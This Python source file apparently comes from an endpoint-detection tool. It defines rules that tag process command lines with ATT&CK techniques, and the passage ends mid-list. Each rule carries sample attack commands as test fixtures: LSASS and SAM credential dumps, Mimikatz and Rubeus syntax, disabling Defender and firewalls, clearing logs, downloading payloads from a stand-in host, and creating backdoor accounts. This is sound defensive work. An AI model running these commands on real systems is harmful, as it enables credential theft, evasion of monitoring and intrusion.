"""ATT&CK techniques recognisable from one process-creation event.

Sysmon (Windows) and Sysmon for Linux both record every process start with its
image and command line. Many techniques are a known tool run with a known
argument - `vssadmin delete shadows`, `netsh advfirewall set allprofiles state
off`, `reg save hklm\\sam` - and until this table existed nothing here read
those command lines for them.

How a rule matches, and why it is shaped that way:

  * A rule names the tool by its *image*, not by a word in a command line.
    JARVIS's own collectors pass whole PowerShell scripts on the command line,
    and those scripts mention half the tools below; a keyword rule would report
    JARVIS to itself all day. The process whose image is `vssadmin.exe` is the
    one that ran it.
  * The argument pattern must match that process's own command line.
  * A few rules have no image (ANY): offensive tool syntax that has no benign
    reading wherever it appears (`sekurlsa::`, `stratum+tcp://`).
  * PowerShell cmdlets have no process of their own, so those rules match the
    shell's command line and are limited to state-changing cmdlets with their
    arguments (`Set-MpPreference -DisableRealtimeMonitoring $true`).

Severity is what the action is, never proof of compromise: administrators run
several of these. Discovery commands (`whoami`, `ipconfig`, `net user`) are
ordinary one at a time and are never reported singly - DISCOVERY names them so
the detectors can report a burst of distinct discovery techniques under one
parent, which is what hands-on-keyboard enumeration looks like.

Every rule carries a `sample` that must fire it and may carry `benign`
look-alikes that must not. The coverage map (service/attackmap.py) replays the
samples through the real detectors, so a rule that stops firing shows up as a
regression rather than as silent coverage.

A finding quotes only the matched span of the command line, and nothing at all
for rules marked `quiet`: those command lines carry passwords.
"""

import re
import time
from dataclasses import dataclass

WIN, LINUX = "win", "linux"
ANY = ()
MAX_CMDLINE = 4096          # bytes of a command line a rule may read
MAX_SPAN = 120              # characters of the match quoted in a finding

POWERSHELL = ("powershell", "pwsh")
SHELLS = ("sh", "bash", "dash", "zsh", "ksh", "ash")
# Processes whose command line is other code: text there names tools without
# running them. Image-less Linux rules skip these; the tool a shell really
# starts gets a process event of its own.
INTERPRETERS = SHELLS + ("python", "python3", "node", "perl", "ruby", "php", "bun", "deno",
                         "env", "sudo", "timeout", "nohup", "xargs")
BROWSERS = ("chrome", "msedge", "firefox", "brave", "opera", "vivaldi", "chromium",
            "chromium-browser", "google-chrome", "msedgewebview2")


@dataclass(frozen=True, eq=False)     # rules are compared by identity
class Rule:
    tids: tuple             # ATT&CK technique ids this is evidence of
    platform: str           # WIN or LINUX
    images: tuple           # image base names, lower case, no .exe; ANY = any image
    pattern: str            # regex over the process's own command line
    severity: str
    title: str
    sample: tuple           # (image, command line) that must fire
    benign: tuple = ()      # (image, command line) pairs that must not
    quiet: bool = False     # never quote the command line (it carries a secret)
    not_images: tuple = ()  # images this rule never applies to
    parents: tuple = ()     # when set, the parent's image must be one of these
    sample_parent: str = ""  # parent image the sample runs under
    origin: str = ""        # "" built in; "rulepack:<version>:<id>" from a signed pack

    def regex(self):
        return _compiled(self.pattern)


_CACHE = {}


def _compiled(pattern):
    found = _CACHE.get(pattern)
    if found is None:
        found = _CACHE[pattern] = re.compile(pattern, re.I | re.S)
    return found


def _w(tids, images, pattern, severity, title, sample, benign=(), **kw):
    return Rule(tuple(tids.split()), WIN, tuple(images.split()), pattern, severity, title,
                sample, tuple(benign), **kw)


def _l(tids, images, pattern, severity, title, sample, benign=(), **kw):
    return Rule(tuple(tids.split()), LINUX, tuple(images.split()), pattern, severity, title,
                sample, tuple(benign), **kw)


S32 = r"C:\Windows\System32" + "\\"
PS = S32 + r"WindowsPowerShell\v1.0\powershell.exe"

RULES = (
    # ── credential access ───────────────────────────────────────────────────
    _w("T1003", "procdump procdump64", r"\blsass", "critical",
       "LSASS memory dump with ProcDump",
       (r"C:\Tools\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe out.dmp"),
       [(r"C:\Tools\procdump64.exe", "procdump64.exe -ma 4120 app.dmp")]),
    _w("T1003", "rundll32", r"comsvcs(\.dll)?\s*,?\s*(#\s*\+?0*24\b|MiniDump)", "critical",
       "process memory dump through comsvcs.dll",
       (S32 + "rundll32.exe",
        r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.bin full"),
       [(S32 + "rundll32.exe", r"rundll32.exe shell32.dll,Control_RunDLL")]),
    _w("T1003", "reg", r"\bsave\s+\"?hk(lm|ey_local_machine)\\(sam|security|system)\b",
       "critical", "registry credential hive saved to a file",
       (S32 + "reg.exe", r"reg save HKLM\SAM C:\t\sam.hiv"),
       [(S32 + "reg.exe", r"reg save HKCU\Software\App C:\t\app.hiv")]),
    _w("T1003", "ntdsutil", r"\bifm\b|ac\s+i\s+ntds", "critical",
       "Active Directory database copied with ntdsutil",
       (S32 + "ntdsutil.exe", 'ntdsutil "ac i ntds" "ifm" "create full c:\\t" q q')),
    Rule(("T1003", "T1550", "T1558"), WIN, ANY,
         r"\b(sekurlsa|lsadump|kerberos)::\w+|privilege::debug|token::elevate", "critical",
         "Mimikatz command syntax",
         (r"C:\t\m.exe", 'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit')),
    _w("T1558", "rubeus", r"\b(kerberoast|asreproast|asktgt|asktgs|s4u|ptt|dump|golden|silver)\b",
       "critical", "Kerberos ticket theft or forgery with Rubeus",
       (r"C:\t\Rubeus.exe", "Rubeus.exe kerberoast /outfile:h.txt")),
    # Keyed on the interpreter running the script itself: a shell command line
    # that merely contains these names (an editor, a grep, this file) is not it.
    Rule(("T1558",), LINUX, ("python", "python3", "impacket-getuserspns", "impacket-getnpusers",
                             "impacket-gettgt", "impacket-ticketer"),
         r"^\S+\s+(\S*/)?(GetUserSPNs|GetNPUsers|getTGT|getST|ticketer)\.py\b|^\S*impacket-\w+\s",
         "critical", "Kerberos ticket theft or forgery with Impacket",
         ("/usr/bin/python3", "python3 GetUserSPNs.py corp.local/u:p -request"),
         (("/usr/bin/python3", "python3 -c 'print(\"GetUserSPNs.py\")'"),), quiet=True),
    _l("T1003", "cat head tail less more cp base64 xxd strings dd tar unshadow",
       r"(?<![\w.-])/etc/g?shadow(?![\w.-])", "high", "password hash file read",
       ("/usr/bin/cat", "cat /etc/shadow"),
       [("/usr/bin/cat", "cat /etc/shadow-utils.conf.example.txt.d/README"),
        ("/usr/bin/cat", "cat /etc/passwd")]),
    _w("T1555", "vaultcmd", r"/list(creds|properties)?\b", "medium",
       "Windows Credential Vault enumerated",
       (S32 + "VaultCmd.exe", 'vaultcmd /listcreds:"Windows Credentials" /all')),
    _l("T1555", "secret-tool", r"\b(search|lookup)\b", "medium",
       "desktop keyring queried from a command line",
       ("/usr/bin/secret-tool", "secret-tool search --all service login")),
    Rule(("T1555", "T1539"), WIN, ANY,
         r"(\\Google\\Chrome\\User Data|\\Microsoft\\Edge\\User Data|\\BraveSoftware\\[^\"']*User Data"
         r"|\\Mozilla\\Firefox\\Profiles)[^\"'|;]*\\(Login Data|Cookies|logins\.json|key4\.db"
         r"|cookies\.sqlite)\b",
         "high", "browser credential or cookie store named on a command line",
         (S32 + "cmd.exe",
          r'cmd /c copy "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\t\l'),
         [(S32 + "cmd.exe",
           r'cmd /c dir "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Extensions"'),
          (S32 + "cmd.exe", r'cmd /c dir "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Local Storage"')],
         not_images=BROWSERS + POWERSHELL),
    # The Chromium master key (Local State, os_crypt.encrypted_key) decrypts every
    # saved password and cookie: infostealers copy it beside Login Data (Vidar,
    # Lumma, ChromElevator; spyware research 2026-10-29).
    Rule(("T1555", "T1539"), WIN, ANY,
         r"\\(Google\\Chrome|Microsoft\\Edge|BraveSoftware\\[^\"'|;]*)\\User Data\\Local State\b",
         "high", "browser master-key file named on a command line",
         (S32 + "cmd.exe",
          r'cmd /c copy "C:\Users\u\AppData\Local\Google\Chrome\User Data\Local State" C:\t\k'),
         not_images=BROWSERS + POWERSHELL),
    Rule(("T1555", "T1539"), LINUX, ANY,
         r"/(\.config/(google-chrome|chromium|BraveSoftware/[^/]+)|\.mozilla/firefox)/[^\"'|;]*"
         r"(Login Data|Cookies|logins\.json|key4\.db|cookies\.sqlite)\b",
         "high", "browser credential or cookie store named on a command line",
         ("/usr/bin/cp", "cp /home/u/.config/google-chrome/Default/Cookies /tmp/c"),
         not_images=BROWSERS + INTERPRETERS),
    Rule(("T1555", "T1539"), LINUX, ANY,
         r"/\.config/(google-chrome|chromium|BraveSoftware/[^/]+|microsoft-edge)/Local State\b",
         "high", "browser master-key file named on a command line",
         ("/usr/bin/cp", "cp '/home/u/.config/google-chrome/Local State' /tmp/k"),
         not_images=BROWSERS + INTERPRETERS),
    Rule(("T1217",), WIN, ANY,
         r"(\\Google\\Chrome\\User Data|\\Microsoft\\Edge\\User Data|\\Mozilla\\Firefox\\Profiles)"
         r"[^\"'|;]*\\(Bookmarks|History|places\.sqlite)\b",
         "medium", "browser history or bookmarks read from a command line",
         (S32 + "cmd.exe",
          r'cmd /c type "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"'),
         not_images=BROWSERS + POWERSHELL),
    Rule(("T1217",), LINUX, ANY,
         r"/(\.config/(google-chrome|chromium)|\.mozilla/firefox)/[^\"'|;]*"
         r"(Bookmarks|History|places\.sqlite)\b",
         "medium", "browser history or bookmarks read from a command line",
         ("/usr/bin/sqlite3", "sqlite3 /home/u/.mozilla/firefox/ab.default/places.sqlite .dump"),
         not_images=BROWSERS + INTERPRETERS),

    # ── defence impairment ──────────────────────────────────────────────────
    _w("T1685", "powershell pwsh",
       r"Set-MpPreference\s[^|;]*-Disable\w+\s+(\$true|true|1)\b", "critical",
       "Microsoft Defender protection disabled from PowerShell",
       (PS, "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true"),
       [(PS, "powershell -c Get-MpPreference | Select DisableRealtimeMonitoring"),
        (PS, "powershell -c Set-MpPreference -DisableRealtimeMonitoring $false")]),
    _w("T1685", "powershell pwsh", r"Add-MpPreference\s[^|;]*-Exclusion(Path|Process|Extension)\b",
       "high", "Microsoft Defender exclusion added from PowerShell",
       (PS, r"powershell -c Add-MpPreference -ExclusionPath C:\Users\Public"),
       [(PS, "powershell -c Get-MpPreference | Select ExclusionPath")]),
    _w("T1685", "sc net net1 taskkill",
       r"\b(stop|delete|/im)\b[^|;&]*\b(windefend|sense|wdnissvc|wscsvc|securityhealthservice"
       r"|msmpeng|sysmon(64)?|eventlog|jarvisnativesensor)\b"
       r"|\bconfig\b[^|;&]*\b(windefend|sense|wdnissvc|wscsvc|sysmon(64)?|eventlog"
       r"|jarvisnativesensor)\b[^|;&]*start=\s*disabled", "critical",
       "security service stopped or disabled",
       (S32 + "sc.exe", "sc stop WinDefend"),
       [(S32 + "sc.exe", "sc query WinDefend"), (S32 + "sc.exe", "sc stop Spooler"),
        (S32 + "sc.exe", "sc config JarvisNativeSensor start= auto")]),
    _w("T1685", "sysmon sysmon64", r"(^|\s)[-/]u\b", "critical", "Sysmon uninstalled",
       (r"C:\Windows\Sysmon64.exe", "Sysmon64.exe -u force"),
       [(r"C:\Windows\Sysmon64.exe", "Sysmon64.exe -c config.xml")]),
    _w("T1685", "fltmc", r"\bunload\b", "critical", "file-system filter driver unloaded",
       (S32 + "fltMC.exe", "fltmc unload SysmonDrv"),
       [(S32 + "fltMC.exe", "fltmc filters")]),
    _w("T1685", "wevtutil", r"\b(sl|set-log)\b[^|;&]*/e(nabled)?:false", "high",
       "event log channel disabled",
       (S32 + "wevtutil.exe", "wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false")),
    _l("T1685", "setenforce", r"\b(0|permissive)\b", "high", "SELinux enforcement turned off",
       ("/usr/sbin/setenforce", "setenforce 0"), [("/usr/sbin/setenforce", "setenforce 1")]),
    _l("T1685", "auditctl", r"(^|\s)-(e\s*0|D)\b", "high", "audit rules disabled or flushed",
       ("/usr/sbin/auditctl", "auditctl -e 0"), [("/usr/sbin/auditctl", "auditctl -l")]),
    _l("T1685", "systemctl service",
       r"\b(stop|disable|mask|kill)\b[^|;&]*\b(auditd|sysmon|rsyslog|systemd-journald|apparmor"
       r"|falco|clamav\S*|jarvis\S*)\b", "high", "security service stopped or disabled",
       ("/usr/bin/systemctl", "systemctl stop auditd"),
       [("/usr/bin/systemctl", "systemctl status auditd"),
        ("/usr/bin/systemctl", "systemctl restart jarvis.service")]),
    _w("T1686", "netsh",
       r"advfirewall\s+set\s+\w+\s+state\s+off|firewall\s+set\s+opmode\s+(mode=)?disable",
       "critical", "Windows Firewall turned off",
       (S32 + "netsh.exe", "netsh advfirewall set allprofiles state off"),
       [(S32 + "netsh.exe", "netsh advfirewall show allprofiles"),
        (S32 + "netsh.exe", "netsh advfirewall set allprofiles state on")]),
    _w("T1686", "powershell pwsh",
       r"Set-NetFirewallProfile\s[^|;]*-Enabled\s+(false|\$false|0)\b", "critical",
       "Windows Firewall profile disabled from PowerShell",
       (PS, "powershell -c Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"),
       [(PS, "powershell -c Get-NetFirewallProfile | Select Name,Enabled")]),
    _l("T1686", "ufw", r"\b(disable|reset)\b", "high", "host firewall disabled",
       ("/usr/sbin/ufw", "ufw disable"), [("/usr/sbin/ufw", "ufw status verbose")]),
    _l("T1686", "iptables ip6tables nft",
       r"(^|\s)(-F|--flush)\b|-P\s+(INPUT|FORWARD)\s+ACCEPT|\bflush\s+ruleset\b", "high",
       "firewall rules flushed or default policy opened",
       ("/usr/sbin/iptables", "iptables -F"),
       [("/usr/sbin/iptables", "iptables -L -n"), ("/usr/sbin/iptables", "iptables -S")]),
    _l("T1686", "systemctl service", r"\b(stop|disable|mask)\b[^|;&]*\b(ufw|firewalld|nftables)\b",
       "high", "firewall service stopped or disabled",
       ("/usr/bin/systemctl", "systemctl disable --now firewalld")),
    _w("T1688", "bcdedit", r"/set\b.*\bsafeboot\b", "critical", "next boot forced into Safe Mode",
       (S32 + "bcdedit.exe", "bcdedit /set {default} safeboot network"),
       [(S32 + "bcdedit.exe", "bcdedit /enum")]),
    _w("T1690", "powershell pwsh",
       r"Set-PSReadLineOption\s[^|;]*-HistorySaveStyle\s+SaveNothing", "high",
       "PowerShell command history turned off",
       (PS, "powershell -c Set-PSReadLineOption -HistorySaveStyle SaveNothing")),
    _l("T1690", " ".join(SHELLS),
       r"\bunset\s+HISTFILE\b|\bHISTFILE=/dev/null\b|\bHIST(FILE)?SIZE=0\b|\bset\s+\+o\s+history\b",
       "high", "shell command history turned off",
       ("/usr/bin/bash", "bash -c 'unset HISTFILE; id'"),
       [("/usr/bin/bash", "bash -c 'echo $HISTFILE'")]),
    _w("T1070", "wevtutil", r"\b(cl|clear-log)\b", "critical", "Windows event log cleared",
       (S32 + "wevtutil.exe", "wevtutil cl Security"),
       [(S32 + "wevtutil.exe", "wevtutil qe Security /c:5")]),
    _w("T1070", "powershell pwsh", r"\b(Clear-EventLog|Remove-EventLog)\s+-", "critical",
       "Windows event log cleared from PowerShell",
       (PS, "powershell -c Clear-EventLog -LogName Security")),
    _w("T1553", "certutil", r"-addstore\s+(-\w+\s+)*\"?(root|authroot|trustedpublisher)\b", "high",
       "certificate added to a trusted store",
       (S32 + "certutil.exe", "certutil -addstore -f Root C:\\t\\ca.cer"),
       [(S32 + "certutil.exe", "certutil -store Root")]),
    _w("T1222", "icacls cacls", r"/grant\b[^|;&]*(everyone|\*S-1-1-0|\busers)\"?:(\([A-Z]{2}\))*\(?F\b", "high",
       "full control granted to everyone",
       (S32 + "icacls.exe", r'icacls C:\ProgramData\App /grant Everyone:(OI)(CI)F /T'),
       [(S32 + "icacls.exe", r"icacls C:\ProgramData\App")]),
    _w("T1222", "takeown", r"/f\b", "medium", "file ownership taken",
       (S32 + "takeown.exe", r"takeown /f C:\Windows\System32\sethc.exe")),
    _l("T1222", "chmod",
       r"(^|\s)(-\w+\s+)*(0?777|a\+rwx|o\+w)\s+(/etc|/usr|/bin|/sbin|/boot|/root|/var/www|/lib)\b",
       "medium", "system path made world-writable",
       ("/usr/bin/chmod", "chmod -R 777 /etc/cron.d"),
       [("/usr/bin/chmod", "chmod 755 /usr/local/bin/tool"),
        ("/usr/bin/chmod", "chmod 777 /tmp/build")]),
    _w("T1564", "attrib", r"\+h\b[^|;&]*\+s\b|\+s\b[^|;&]*\+h\b", "medium",
       "file marked hidden and system",
       (S32 + "attrib.exe", r"attrib +h +s C:\Users\Public\svc.exe"),
       [(S32 + "attrib.exe", r"attrib -h C:\Users\u\file.txt")]),

    # ── execution and signed-binary proxies ─────────────────────────────────
    _w("T1047", "wmic", r"\bprocess\s+call\s+create\b", "high", "process started through WMI",
       (S32 + r"wbem\WMIC.exe", 'wmic process call create "cmd /c whoami"'),
       [(S32 + r"wbem\WMIC.exe", "wmic process list brief")]),
    _w("T1047 T1021", "wmic", r"/node:\s*\"?[\w.-]+", "high", "WMI command sent to another host",
       (S32 + r"wbem\WMIC.exe", "wmic /node:10.0.0.5 os get caption"),
       [(S32 + r"wbem\WMIC.exe", "wmic os get caption")]),
    _w("T1047", "powershell pwsh",
       r"(Invoke-WmiMethod|Invoke-CimMethod)\s[^|;]*Win32_Process[^|;]*\bCreate\b", "high",
       "process started through WMI from PowerShell",
       (PS, "powershell -c Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList calc")),
    _w("T1218", "mshta", r"https?://|javascript:|vbscript:", "high",
       "mshta given a remote or inline script",
       (S32 + "mshta.exe", "mshta https://x.example/a.hta"),
       [(S32 + "mshta.exe", r"mshta C:\Program Files\App\help.hta")]),
    _w("T1218", "regsvr32", r"/i:\s*https?://|scrobj\.dll", "high",
       "regsvr32 used to run a scriptlet",
       (S32 + "regsvr32.exe", "regsvr32 /s /n /u /i:https://x.example/a.sct scrobj.dll"),
       [(S32 + "regsvr32.exe", r"regsvr32 /s C:\Windows\System32\msxml3.dll")]),
    _w("T1218", "rundll32", r"javascript:|https?://|\\\\[\w.-]+\\[\w$]+\\", "high",
       "rundll32 given a script or remote path",
       (S32 + "rundll32.exe", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'),
       [(S32 + "rundll32.exe", "rundll32.exe shell32.dll,Options_RunDLL 0")]),
    _w("T1218", "msiexec", r"/(i|package)\s*\"?https?://", "high",
       "msiexec installing from a URL",
       (S32 + "msiexec.exe", "msiexec /q /i https://x.example/a.msi"),
       [(S32 + "msiexec.exe", r"msiexec /i C:\Users\u\Downloads\setup.msi")]),
    _w("T1218", "cmstp", r"/(s|ni)\b", "high", "cmstp run silently with an INF",
       (S32 + "cmstp.exe", r"cmstp.exe /ni /s C:\t\a.inf")),
    _w("T1218 T1055", "mavinject", r"/injectrunning\b", "critical",
       "DLL injected with mavinject",
       (S32 + "mavinject.exe", r"mavinject.exe 4172 /INJECTRUNNING C:\t\a.dll")),
    _w("T1216", "cscript wscript",
       r"\b(pubprn\.vbs|SyncAppvPublishingServer\.vbs|manage-bde\.wsf|winrm\.vbs|slmgr\.vbs)\b"
       r"[^|;&]*(script:|https?://|;|\binvoke\b)", "high",
       "signed Windows script used to run other code",
       (S32 + "cscript.exe",
        r"cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "
        r"script:https://x.example/a.sct"),
       [(S32 + "cscript.exe", r"cscript C:\Windows\System32\slmgr.vbs /dli")]),
    _w("T1220", "wmic", r"/format:\s*\"?(https?://|[^\"\s]+\.xsl\b)", "high",
       "WMIC given an XSL stylesheet to run",
       (S32 + r"wbem\WMIC.exe", "wmic os get /format:https://x.example/a.xsl"),
       [(S32 + r"wbem\WMIC.exe", "wmic os get caption /format:list")]),
    _w("T1220", "msxsl", r"\S+\s+\S+", "high", "msxsl running an XSL transform",
       (r"C:\t\msxsl.exe", r"msxsl.exe C:\t\a.xml C:\t\a.xsl")),
    _w("T1127", "msbuild", r"\\(temp|appdata|users\\public|downloads|programdata)\\[^\"\s]*\.(xml|csproj|proj)\b",
       "medium", "MSBuild building a project from a user-writable staging path",
       (r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
        r"MSBuild.exe C:\Users\u\AppData\Local\Temp\a.xml"),
       [(r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
         r"MSBuild.exe C:\src\app\app.csproj /p:Configuration=Release")]),
    _w("T1202", "forfiles", r"/c\b", "high", "command run indirectly through forfiles",
       (S32 + "forfiles.exe", "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe")),
    _w("T1202", "pcalua", r"(^|\s)-a\b", "high", "command run indirectly through pcalua",
       (S32 + "pcalua.exe", "pcalua.exe -a calc.exe")),
    _w("T1197 T1105", "bitsadmin", r"/(transfer|addfile|setnotifycmdline)\b", "high",
       "BITS job created from a command line",
       (S32 + "bitsadmin.exe", r"bitsadmin /transfer j https://x.example/a.exe C:\t\a.exe"),
       [(S32 + "bitsadmin.exe", "bitsadmin /list /allusers")]),
    _w("T1105", "certutil", r"-(urlcache|verifyctl)\b[^|;&]*https?://", "high",
       "certutil used to download a file",
       (S32 + "certutil.exe", r"certutil -urlcache -split -f https://x.example/a.exe a.exe")),
    _w("T1140", "certutil", r"-decode(hex)?\b", "high", "certutil used to decode a file",
       (S32 + "certutil.exe", r"certutil -decode C:\t\a.b64 C:\t\a.exe"),
       [(S32 + "certutil.exe", "certutil -hashfile a.exe SHA256")]),
    _l("T1140 T1027", " ".join(SHELLS),
       r"base64\s+(-d|--decode|-D)\b[^|;&]*\|\s*(ba|z|da|k)?sh\b", "high",
       "base64 payload decoded straight into a shell",
       ("/usr/bin/bash", "bash -c 'echo aWQK | base64 -d | sh'"),
       [("/usr/bin/bash", "bash -c 'base64 -d token.b64 > token.bin'")]),
    _w("T1569 T1021", "psexec psexec64 paexec", r"\\\\[\w.-]+|(^|\s)-s\b", "high",
       "PsExec used to run a command as a service",
       (r"C:\Tools\PsExec64.exe", r"PsExec64.exe \\10.0.0.5 -s cmd.exe")),
    _w("T1021", "winrs", r"[-/]r(emote)?:", "high", "command run on another host through WinRM",
       (S32 + "winrs.exe", "winrs -r:host01 cmd")),
    _w("T1570", "xcopy robocopy cmd", r"\\\\[\w.-]+\\(admin|ipc|[a-z])\$", "high",
       "file copied to another host's administrative share",
       (S32 + "xcopy.exe", r"xcopy C:\t\a.exe \\host01\ADMIN$\a.exe"),
       [(S32 + "xcopy.exe", r"xcopy C:\src \\nas\share\backup /e")]),
    _w("T1134", "runas", r"/(netonly|savecred)\b", "medium",
       "runas with alternate network credentials",
       (S32 + "runas.exe", r"runas /netonly /user:corp\admin cmd.exe"), quiet=True),

    # ── persistence and privilege ───────────────────────────────────────────
    _w("T1053", "schtasks",
       r"/create\b.*?/tr\s+\"?[^|;&]*(powershell|pwsh|cmd(\.exe)?\s|mshta|wscript|cscript|rundll32"
       r"|regsvr32|\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\|https?://)",
       "high", "scheduled task created to run a script host or a staging path",
       (S32 + "schtasks.exe",
        r'schtasks /create /tn Updater /tr "powershell -w hidden -f C:\Users\Public\u.ps1" /sc onlogon'),
       [(S32 + "schtasks.exe", "schtasks /query /fo LIST"),
        (S32 + "schtasks.exe", r'schtasks /create /tn Backup /tr "C:\Program Files\App\b.exe" /sc daily')]),
    _w("T1053", "at", r"\d{1,2}:\d{2}", "medium", "job scheduled with the legacy at command",
       (S32 + "at.exe", "at 13:20 /interactive cmd")),
    _w("T1543 T1569", "sc", r"\bcreate\b.*\bbinpath\s*=", "high", "Windows service created",
       (S32 + "sc.exe", r'sc create Updater binPath= "C:\Users\Public\u.exe" start= auto'),
       [(S32 + "sc.exe", "sc query type= service")]),
    _w("T1112 T1547", "reg",
       r"\badd\b[^|;&]*\\CurrentVersion\\(Run|RunOnce)\b", "high",
       "autostart Run key written with reg.exe",
       (S32 + "reg.exe",
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d C:\Users\Public\u.exe /f'),
       [(S32 + "reg.exe", r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run")]),
    _w("T1112 T1546", "reg",
       r"\badd\b[^|;&]*Image File Execution Options\\[^|;&]*\b(debugger|globalflag)\b", "critical",
       "Image File Execution Options debugger set",
       (S32 + "reg.exe",
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
        r'\sethc.exe" /v Debugger /d cmd.exe /f')),
    _w("T1112 T1548", "reg",
       r"\badd\b[^|;&]*(ms-settings\\shell\\open\\command|mscfile\\shell\\open\\command"
       r"|exefile\\shell\\(open|runas)\\command|\\Policies\\System\"?\s[^|;&]*EnableLUA[^|;&]*/d\s+0\b)",
       "critical", "UAC bypass or UAC-disable registry write",
       (S32 + "reg.exe",
        r'reg add HKCU\Software\Classes\ms-settings\shell\open\command /d C:\t\a.exe /f')),
    _w("T1112 T1003", "reg", r"\badd\b[^|;&]*\\WDigest\"?\s[^|;&]*UseLogonCredential[^|;&]*/d\s+1\b",
       "critical", "WDigest plaintext credential caching enabled",
       (S32 + "reg.exe",
        r"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "
        r"/v UseLogonCredential /t REG_DWORD /d 1 /f")),
    _w("T1112 T1037", "reg", r"\badd\b[^|;&]*UserInitMprLogonScript", "high",
       "logon script registered",
       (S32 + "reg.exe", r"reg add HKCU\Environment /v UserInitMprLogonScript /d C:\t\a.bat /f")),
    _w("T1112 T1137", "reg",
       r"\badd\b[^|;&]*\\Office( test)?\\[^|;&]*(Outlook\\(WebView|Today)|Special\\Perf|\\Addins\\)",
       "high", "Office startup or add-in key written",
       (S32 + "reg.exe",
        r'reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /d C:\t\a.dll /f')),
    _w("T1546", "powershell pwsh wmic",
       r"(Set-WmiInstance|New-CimInstance|Register-WmiEvent|\bcreate\b)\s[^|;]*"
       r"(__EventFilter|EventConsumer|__FilterToConsumerBinding|root\\subscription)",
       "high", "WMI event subscription created",
       (PS, "powershell -c Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $f"),
       [(PS, "powershell -c Get-WmiObject Win32_OperatingSystem")]),
    _w("T1136", "net net1", r"\buser\b\s+\S+.*\s/add\b", "high", "local account created",
       (S32 + "net.exe", "net user backdoor P@ss /add"),
       [(S32 + "net.exe", "net user")], quiet=True),
    _w("T1136", "powershell pwsh", r"\bNew-LocalUser\s", "high",
       "local account created from PowerShell",
       (PS, "powershell -c New-LocalUser -Name backdoor -NoPassword"), quiet=True),
    _l("T1136", "useradd adduser", r"^(?!.*(\s-r\b|--system\b)).+\s\S+\s*$", "medium",
       "login account created",
       ("/usr/sbin/useradd", "useradd -m -s /bin/bash backdoor"),
       [("/usr/sbin/useradd", "useradd -r -s /usr/sbin/nologin svc-app"),
        ("/usr/sbin/adduser", "adduser --system --no-create-home svc-app")], quiet=True),
    _w("T1098", "net net1",
       r"\blocalgroup\s+\"?(administrators|remote desktop users|backup operators)\"?\s+.*\s/add\b",
       "high", "account added to a privileged local group",
       (S32 + "net.exe", "net localgroup Administrators backdoor /add"),
       [(S32 + "net.exe", "net localgroup Administrators")]),
    _l("T1098", "usermod gpasswd", r"(-aG|-G|-a)\s*\S*\b(sudo|wheel|root|admin|docker)\b", "high",
       "account added to a privileged group",
       ("/usr/sbin/usermod", "usermod -aG sudo backdoor"),
       [("/usr/sbin/usermod", "usermod -s /bin/zsh u")]),
    # Package installs set these bits on their own files under the system
    # directories (measured: dpkg, polkit helper); anywhere else is the finding.
    _l("T1548", "chmod",
       r"(^|\s)(-\w+\s+)*([ug]\+s|[ug]{2}\+s|[2467][0-7]{3})\s+(?!/usr/|/bin/|/sbin/|/lib)\S", "high",
       "setuid or setgid bit set outside the system directories",
       ("/usr/bin/chmod", "chmod u+s /tmp/sh"),
       [("/usr/bin/chmod", "chmod 0755 /tmp/sh"),
        ("/usr/bin/chmod", "chmod 4755 /usr/lib/polkit-1/polkit-agent-helper-1")]),
    _l("T1548", "setcap", r"cap_(setuid|setgid|sys_admin|dac_override|sys_ptrace|sys_module)", "high",
       "powerful file capability granted",
       ("/usr/sbin/setcap", "setcap cap_setuid+ep /tmp/python3"),
       [("/usr/sbin/setcap", "setcap cap_net_bind_service+ep /usr/bin/node")]),
    _w("T1176", " ".join(BROWSERS), r"--load-extension=", "medium",
       "browser started with an unpacked extension",
       (r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"chrome.exe --load-extension=C:\Users\u\AppData\Local\Temp\ext")),
    _l("T1611", "nsenter", r"(-t\s*1\b|--target[= ]1\b)", "high",
       "namespace entry into the host's init process",
       ("/usr/bin/nsenter", "nsenter -t 1 -m -u -i -n -p sh"),
       [("/usr/bin/nsenter", "nsenter -t 4312 -n ip addr")]),
    _l("T1611", "docker podman nerdctl",
       r"\brun\b.*(-v\s*/:/|--volume[= ]/:/|--pid[= ]host|-v\s*/var/run/docker\.sock)", "medium",
       "container started with the host filesystem, pid namespace or Docker socket",
       ("/usr/bin/docker", "docker run -it -v /:/host alpine chroot /host"),
       [("/usr/bin/docker", "docker run --rm -v /home/u/app:/app node:22 npm test")]),
    # Container attack surface (DOCKER-ATTACK-SURFACE-2026-10-23): what the
    # operator of the daemon does, as seen in process creation. The owner is
    # that operator most of the time; the rules say what was done, not who.
    _l("T1610 T1611", "docker podman nerdctl",
       r"\b(run|create)\b.*(--privileged\b|--cap-add[= ]?(CAP_)?(SYS_ADMIN|SYS_PTRACE|SYS_MODULE|ALL)\b"
       r"|--security-opt[= ]?(seccomp|apparmor)[=:]unconfined)", "high",
       "container started privileged, with an escape capability, or without seccomp/AppArmor",
       ("/usr/bin/docker", "docker run -d --privileged --restart=always alpine sh -c 'echo x | base64 -d | sh'"),
       [("/usr/bin/docker", "docker run --rm --cap-add NET_BIND_SERVICE -p 80:80 nginx:1.27"),
